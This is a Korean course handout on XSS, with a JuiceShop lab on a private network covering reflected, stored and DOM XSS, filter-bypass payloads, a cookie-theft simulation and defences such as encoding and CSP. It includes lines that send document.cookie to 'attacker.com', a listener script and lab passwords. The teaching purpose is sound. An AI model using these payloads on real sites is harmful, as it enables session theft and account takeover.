# Week 05: OWASP Top 10 (2) - XSS (Cross-Site Scripting)

## 학습 목표
- XSS(Cross-Site Scripting)의 개념과 위험성을 이해한다
- Reflected, Stored, DOM-based XSS의 차이를 파악한다
- JuiceShop에서 실제 XSS 공격을 수행한다
- XSS 방어 기법(출력 인코딩, CSP)을 이해한다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (이 과목에서 자주 나오는 용어)

> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
> 강의 중 모르는 용어가 나오면 이 표를 참고하라.

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
| **OpsClaw** | OpsClaw | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |


---

# Week 05: OWASP Top 10 (2) - XSS (Cross-Site Scripting)

## 학습 목표

- XSS(Cross-Site Scripting)의 개념과 위험성을 이해한다
- Reflected, Stored, DOM-based XSS의 차이를 파악한다
- JuiceShop에서 실제 XSS 공격을 수행한다
- XSS 방어 기법(출력 인코딩, CSP)을 이해한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| opsclaw | 10.20.30.201 | 실습 기지 |
| web | 10.20.30.80 | JuiceShop:3000 |

---

## 1. XSS란?

XSS(Cross-Site Scripting)는 공격자가 웹 페이지에 **악성 JavaScript 코드를 삽입**하여, 다른 사용자의 브라우저에서 실행시키는 공격이다.

> **이름의 유래**: CSS(Cascading Style Sheets)와 구분하기 위해 XSS라고 부른다.

### 왜 위험한가?

> **XSS가 SQLi보다 흔한 이유:**
> SQLi는 매개변수화된 쿼리 하나로 방어할 수 있지만, XSS는 모든 출력 지점에서 인코딩을 해야 한다.
> 하나라도 빠뜨리면 취약점이 된다. OWASP에 따르면 웹 애플리케이션의 약 65%에 XSS가 존재한다.
>
> **실제 사례:**
> - 2018년 British Airways: Stored XSS로 38만 건 신용카드 정보 유출 (벌금 £20M)
> - 2019년 Fortnite: DOM XSS로 사용자 계정 탈취 가능
> - XSS는 "Low" 위험으로 분류되기 쉽지만, 쿠키 탈취→계정 접근→데이터 유출로 이어지면 "HIGH"

JavaScript가 브라우저에서 실행되면 다음이 가능하다:
- **쿠키/세션 토큰 탈취** → 다른 사용자의 계정으로 로그인
- **키 입력 기록** → 비밀번호, 신용카드 번호 수집
- **페이지 내용 변조** → 가짜 로그인 폼 표시
- **악성 사이트로 리다이렉트**
- **CSRF 공격 수행** → 사용자 모르게 행동 실행

### SQL Injection vs XSS 비교

| 구분 | SQL Injection | XSS |
|------|---------------|-----|
| 공격 대상 | 서버(데이터베이스) | 클라이언트(브라우저) |
| 삽입 코드 | SQL 구문 | JavaScript 코드 |
| 실행 위치 | 서버의 DB 엔진 | 피해자의 브라우저 |
| 피해 | 데이터 유출/변조 | 세션 탈취, 페이지 변조 |

---

## 2. XSS 유형

> **이 실습을 왜 하는가?**
> "OWASP Top 10 (2) - XSS (Cross-Site Scripting)" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 사이버보안 공격/웹해킹/침투테스트 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.


### 2.1 Reflected XSS (반사형)

공격 코드가 URL 파라미터에 포함되어, 서버가 응답에 그대로 반영(reflect)한다. 피해자가 악성 링크를 클릭해야 동작한다.

**동작 흐름:**
```
1. 공격자가 악성 URL을 만듦:
   http://target.com/search?q=<script>alert('XSS')</script>

2. 피해자가 이 링크를 클릭

3. 서버가 검색 결과 페이지를 반환하면서 입력을 그대로 포함:
   "검색어: <script>alert('XSS')</script>에 대한 결과"

4. 피해자 브라우저에서 JavaScript 실행!
```

**실습:**

```bash
# JuiceShop 검색에 스크립트 삽입 시도
# URL 인코딩: < = %3C, > = %3E
curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E" \
  | python3 -m json.tool | head -10

# 검색 결과가 HTML에 반영되는지 확인
curl -s "http://10.20.30.80:3000/#/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E" | head -20
```

> **참고**: JuiceShop은 SPA(Single Page Application)이므로 검색 API(`/rest/products/search`)는 JSON을 반환한다.
> curl로는 XSS 실행을 확인할 수 없으며, **브라우저에서 직접 URL을 입력**해야 DOM XSS를 확인할 수 있다.
> 브라우저에서 `http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(1)">` 을 입력하면
> JuiceShop의 DOM XSS 챌린지를 풀 수 있다.
>
> **실습 방법:**
> 1. 브라우저에서 `http://10.20.30.80:3000` 접속
> 2. 검색창에 `<iframe src="javascript:alert(1)">` 입력
> 3. alert(1) 팝업이 뜨면 XSS 성공 (DOM-based XSS)
> 4. 이것은 curl이 아닌 **브라우저에서만** 동작한다 (JavaScript 실행 필요)

### 2.2 Stored XSS (저장형)

공격 코드가 서버의 데이터베이스에 **저장**되어, 해당 데이터를 보는 모든 사용자에게 영향을 준다. Reflected보다 훨씬 위험하다.

**동작 흐름:**
```
1. 공격자가 게시글/댓글에 악성 스크립트를 작성
   내용: "좋은 제품이에요! <script>document.location='http://attacker.com/steal?c='+document.cookie</script>"

2. 서버가 이 내용을 데이터베이스에 저장

3. 다른 사용자가 해당 게시글을 볼 때마다 스크립트가 실행됨!

4. 피해자의 쿠키가 공격자 서버로 전송됨
```

### 2.3 DOM-based XSS

서버를 거치지 않고, 클라이언트 측 JavaScript가 DOM(Document Object Model)을 조작할 때 발생한다.

**동작 흐름:**
```
1. 웹 페이지의 JavaScript가 URL 파라미터를 읽어서 페이지에 삽입:
   document.getElementById('output').innerHTML = location.hash.substring(1);

2. 공격자가 URL 조작:
   http://target.com/page#<img src=x onerror=alert('XSS')>

3. JavaScript가 DOM에 직접 삽입 → 브라우저에서 실행!
```

---

## 3. JuiceShop XSS 실습

### 3.1 Challenge: DOM XSS

JuiceShop의 검색 기능은 DOM-based XSS에 취약하다.

**Step 1: 정상 검색 확인**

```bash
# 검색 API 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" \
  | python3 -m json.tool | head -15
```

**Step 2: XSS 페이로드 테스트**

브라우저에서 다음 URL을 열어야 한다 (curl로는 DOM XSS 확인 불가):

```
http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert('xss')">
```

curl로 JuiceShop이 입력을 어떻게 처리하는지 확인:

```bash
# 검색어에 HTML 태그가 포함된 경우 응답 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Ciframe+src%3D%22javascript%3Aalert(%60xss%60)%22%3E" \
  | python3 -m json.tool | head -10
```

> **실습 안내**: DOM XSS는 브라우저에서만 동작한다. `curl`은 JavaScript를 실행하지 않으므로, 이 챌린지는 브라우저에서 직접 URL을 입력하여 테스트해야 한다.

### 3.2 Challenge: Reflected XSS

JuiceShop의 주문 추적 기능에서 Reflected XSS를 시도한다.

```bash
# 주문 추적 API 확인
curl -s "http://10.20.30.80:3000/rest/track-order/test123" \
  | python3 -m json.tool

# XSS 페이로드 삽입
curl -s "http://10.20.30.80:3000/rest/track-order/%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E" \
  | python3 -m json.tool
```

> 브라우저에서 `http://10.20.30.80:3000/#/track-result?id=<iframe src="javascript:alert('xss')">` 접근

### 3.3 Challenge: Stored XSS via API

JuiceShop의 사용자 프로필이나 피드백 기능에 XSS를 저장한다.

```bash
# 먼저 로그인하여 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 계정이 없으면 생성
if [ -z "$TOKEN" ]; then
  curl -s -X POST http://10.20.30.80:3000/api/Users/ \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Student123!","passwordRepeat":"Student123!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"test"}'  # 요청 데이터(body)
  TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Student123!"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
fi

echo "Token: $TOKEN"

# 피드백에 XSS 페이로드 저장 시도
curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{                                                # 요청 데이터(body)
    "UserId": 1,
    "captchaId": 0,
    "captcha": "-1",
    "comment": "Great shop! <script>alert(\"stored xss\")</script>",
    "rating": 5
  }' | python3 -m json.tool
```

> **참고**: captcha 값이 필요할 수 있다. 실제 공격에서는 captcha를 먼저 가져온다:

```bash
# captcha 가져오기
CAPTCHA=$(curl -s http://10.20.30.80:3000/api/Captchas/ \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['captchaId'],d['answer'])" 2>/dev/null)
echo "Captcha: $CAPTCHA"
```

---

## 4. XSS 페이로드 모음

다양한 XSS 페이로드를 알아두면 우회 기법을 이해할 수 있다.

### 4.1 기본 페이로드

```html
<!-- 기본 alert -->
<script>alert('XSS')</script>

<!-- img 태그의 onerror 이벤트 -->
<img src=x onerror=alert('XSS')>

<!-- iframe으로 JavaScript 실행 -->
<iframe src="javascript:alert('XSS')">

<!-- SVG 태그 -->
<svg onload=alert('XSS')>

<!-- body 태그 -->
<body onload=alert('XSS')>

<!-- input 태그 -->
<input onfocus=alert('XSS') autofocus>
```

### 4.2 필터 우회 기법

```html
<!-- 대소문자 혼합 -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- 인코딩 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>

<!-- script 태그가 필터링될 때 -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>

<!-- 백틱 사용 (따옴표 필터링 우회) -->
<img src=x onerror=alert(`XSS`)>
```

### 4.3 실습: 다양한 페이로드 테스트

```bash
# 각 페이로드가 필터링되는지 확인
PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "<iframe src='javascript:alert(1)'>"
)

for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
  echo "Testing: $payload"
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/rest/products/search?q=$ENCODED")
  echo "  HTTP Status: $RESPONSE"
  echo ""
done
```

---

## 5. 쿠키 탈취 시뮬레이션

실제 공격에서 XSS의 가장 흔한 용도는 **쿠키(세션 토큰) 탈취**다.

### 5.1 공격 시나리오

```
1. 공격자가 XSS가 있는 페이지에 삽입:
   <script>
     new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;
   </script>

2. 피해자가 해당 페이지를 방문

3. 피해자의 브라우저가 쿠키를 공격자 서버로 전송

4. 공격자가 탈취한 쿠키로 피해자의 세션 사용
```

### 5.2 시뮬레이션: 간이 수신 서버

```bash
# opsclaw 서버에서 간이 HTTP 서버 실행 (쿠키 수신용)
# 터미널 1: 수신 서버 시작
python3 -c "                                           # Python 코드 실행
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[STOLEN] {self.path}')
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass
HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
" &
STEAL_PID=$!
echo "Steal server PID: $STEAL_PID (port 9999)"

# 터미널 2: XSS 페이로드가 동작한다면 다음과 같은 요청이 수신됨
# (시뮬레이션)
curl -s "http://10.20.30.201:9999/steal?cookie=token=eyJhbGciOi..." > /dev/null 2>&1  # silent 모드

# 서버 종료
kill $STEAL_PID 2>/dev/null                            # 프로세스 종료
```

> **실습 목적**: 실제 XSS가 성공하면 이런 방식으로 쿠키가 유출된다는 것을 이해하기 위한 시뮬레이션이다.

### 5.3 HttpOnly 플래그의 중요성

```bash
# JuiceShop 쿠키의 HttpOnly 설정 확인
curl -v -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' 2>&1 \
  | grep -i "set-cookie"
```

**분석:**
- `HttpOnly` 플래그가 있으면: `document.cookie`로 접근 불가 → XSS로 쿠키 탈취 어려움
- `HttpOnly` 플래그가 없으면: JavaScript로 쿠키 접근 가능 → 탈취 위험

> JuiceShop의 JWT 토큰은 쿠키가 아닌 localStorage에 저장되므로, `document.cookie` 대신 `localStorage.getItem('token')`으로 탈취해야 한다.

---

## 6. XSS 방어 기법

### 6.1 출력 인코딩 (Output Encoding)

사용자 입력을 HTML에 삽입할 때 특수 문자를 인코딩한다.

| 문자 | 인코딩 |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

```html
<!-- 취약한 코드 -->
<p>검색어: 사용자입력</p>
<!-- 만약 사용자입력이 <script>alert(1)</script>이면 스크립트 실행됨! -->

<!-- 안전한 코드 -->
<p>검색어: &lt;script&gt;alert(1)&lt;/script&gt;</p>
<!-- 브라우저에 텍스트로 표시됨, 실행되지 않음 -->
```

### 6.2 Content Security Policy (CSP)

CSP는 브라우저에게 "이 페이지에서 실행할 수 있는 스크립트의 출처"를 알려주는 HTTP 헤더다.

```bash
# CSP 헤더 확인
curl -sI http://10.20.30.80:3000/ | grep -i "content-security-policy"
```

**CSP 예시:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

이 설정은:
- 기본적으로 같은 출처('self')의 리소스만 허용
- 스크립트는 같은 출처와 cdn.example.com에서만 로드 가능
- 인라인 스크립트(`<script>alert(1)</script>`) 차단!

### 6.3 X-XSS-Protection 헤더

```bash
# X-XSS-Protection 헤더 확인
curl -sI http://10.20.30.80:3000/ | grep -i "x-xss"
```

> **참고**: `X-XSS-Protection`은 구형 브라우저용이며, 현재는 CSP가 더 효과적이다.

### 6.4 입력 검증과 새니타이징

```javascript
// DOMPurify 라이브러리로 HTML 정화
const clean = DOMPurify.sanitize(userInput);
document.getElementById('output').innerHTML = clean;
// <script> 태그 등 위험한 요소가 자동 제거됨
```

---

## 7. XSS와 SIEM 탐지

### 7.1 웹 서버 로그에서 XSS 흔적

원격 서버에 접속하여 명령을 실행합니다.

```bash
# web 서버의 Apache 접근 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sudo cat /var/log/apache2/access.log | grep -i 'script\|alert\|onerror' | tail -5"

# JuiceShop 로그에서 XSS 시도 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sudo docker logs juiceshop 2>&1 | grep -i 'script\|xss' | tail -5" 2>/dev/null
```

### 7.2 Wazuh에서 XSS 탐지

원격 서버에 접속하여 명령을 실행합니다.

```bash
# Wazuh에서 XSS 관련 알림 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo grep -i 'xss\|cross.site\|script' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3"
```

---

## 8. OpsClaw로 XSS 테스트 자동화

OpsClaw Manager API를 호출하여 작업을 수행합니다.

```bash
# XSS 테스트 프로젝트 생성
PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week05-xss-test","request_text":"JuiceShop XSS 취약점 점검","master_mode":"external"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

# Stage 전환
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키

# XSS 페이로드 테스트 자동 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{                                                # 요청 데이터(body)
    "tasks": [
      {"order":1, "instruction_prompt":"curl -sI http://10.20.30.80:3000/ | grep -iE \"content-security|x-xss|x-frame\"", "risk_level":"low"},
      {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E | head -5", "risk_level":"low"}
    ],
    "subagent_url": "http://localhost:8002"
  }'

# 결과 확인
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool
```

---

## 9. 실습 체크리스트

- [ ] JuiceShop 검색에서 DOM XSS 페이로드 테스트 (`<iframe src="javascript:alert('xss')">`)
- [ ] 주문 추적에서 Reflected XSS 테스트
- [ ] 피드백 API에 Stored XSS 페이로드 제출 시도
- [ ] 쿠키 탈취 시뮬레이션 수행 (간이 서버 + curl)
- [ ] JuiceShop의 CSP 및 보안 헤더 현황 분석
- [ ] 다양한 XSS 페이로드(img, svg, iframe)로 필터 우회 시도

---

## 과제

1. JuiceShop에서 최소 1개의 XSS 챌린지를 성공시키고, 사용한 페이로드와 과정을 설명하라
2. `<script>alert(1)</script>`이 필터링될 때, 이를 우회할 수 있는 대체 페이로드 3개를 제시하라
3. CSP(Content-Security-Policy) 헤더가 설정되어 있을 때 XSS 공격이 왜 어려워지는지 설명하라
4. Stored XSS가 Reflected XSS보다 더 위험한 이유를 실제 시나리오와 함께 설명하라

---

## 핵심 요약

- **XSS**는 악성 JavaScript를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격이다
- **Reflected XSS**: URL에 포함, 피해자가 클릭해야 동작
- **Stored XSS**: DB에 저장, 페이지를 보는 모든 사용자에게 영향 (더 위험)
- **DOM-based XSS**: 서버를 거치지 않고 클라이언트 측 JavaScript에서 발생
- **방어**: 출력 인코딩, CSP, HttpOnly 쿠키, 입력 새니타이징

> **다음 주 예고**: Week 06에서는 인증 및 접근 제어 취약점을 다룬다. JWT 공격, IDOR(Insecure Direct Object Reference), 권한 상승 공격을 JuiceShop에서 실습한다.


---


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** XSS(Cross-Site Scripting)의 핵심은?
- (a) SQL 쿼리 변조  (b) **웹페이지에 악성 JavaScript 삽입**  (c) 서버 파일 삭제  (d) 패킷 스니핑

**Q2.** Reflected XSS와 Stored XSS의 차이는?
- (a) 속도  (b) **공격 코드가 URL에 포함 vs DB에 저장**  (c) 사용 언어  (d) 피해 범위

**Q3.** `<script>alert(1)</script>`가 실행되면 어떤 취약점인가?
- (a) SQLi  (b) CSRF  (c) **XSS**  (d) SSRF

**Q4.** XSS로 탈취할 수 있는 가장 위험한 정보는?
- (a) 페이지 내용  (b) **세션 쿠키 (document.cookie)**  (c) 서버 IP  (d) CSS 스타일

**Q5.** DOM-based XSS가 서버에서 탐지하기 어려운 이유는?
- (a) 암호화되어서  (b) **서버로 요청이 가지 않고 브라우저에서만 실행**  (c) 매우 빨라서  (d) 로그가 없어서

**Q6.** XSS 방어에서 가장 중요한 기법은?
- (a) IP 차단  (b) HTTPS  (c) **출력 인코딩(HTML Entity Encoding)**  (d) 방화벽

**Q7.** `&lt;script&gt;`에서 `&lt;`의 의미는?
- (a) 작다  (b) **HTML 엔티티로 인코딩된 < 문자**  (c) 에러  (d) 주석

**Q8.** Content-Security-Policy(CSP) 헤더의 역할은?
- (a) 캐시 제어  (b) **허용된 스크립트 출처만 실행 허용**  (c) 인증  (d) 압축

**Q9.** `HttpOnly` 쿠키 플래그의 효과는?
- (a) HTTPS만 전송  (b) **JavaScript에서 쿠키 접근 불가**  (c) 자동 만료  (d) 암호화

**Q10.** Stored XSS가 Reflected XSS보다 더 위험한 이유는?
- (a) 빨라서  (b) **한 번 저장되면 해당 페이지를 방문하는 모든 사용자가 영향**  (c) 탐지 불가  (d) 서버 장악

**정답:** Q1:b, Q2:b, Q3:c, Q4:b, Q5:b, Q6:c, Q7:b, Q8:b, Q9:b, Q10:b

---
---

> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab
